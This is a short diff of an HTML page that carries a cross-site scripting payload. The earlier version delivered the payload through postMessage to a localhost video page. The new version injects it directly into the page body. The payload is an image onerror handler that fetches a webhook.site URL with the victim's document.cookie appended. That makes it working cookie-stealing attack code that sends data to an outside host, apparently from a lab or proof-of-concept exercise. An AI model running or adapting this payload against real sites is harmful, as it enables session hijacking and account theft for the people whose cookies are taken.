@@ -2,18 +2,8 @@
 <html>
 <body>
   <script>
-
-    const w = window.open('http://localhost:3000/video.html?v=1');
-    
-    setTimeout(() => {
-
       const xssPayload = '<img src="x"onerror="fetch(`https://webhook.site/237f6f29-8cfd-4ef2-82c8-f4d61204c215?cookie=`+encodeURIComponent(document.cookie))">';
-      
-      w.postMessage({
-        type: 'overlay-update',
-        content: xssPayload
-      }, '*');
-    }, 2000); // fml bruh
+      document.body.innerHTML = xssPayload;
   </script>
 </body>
 </html>
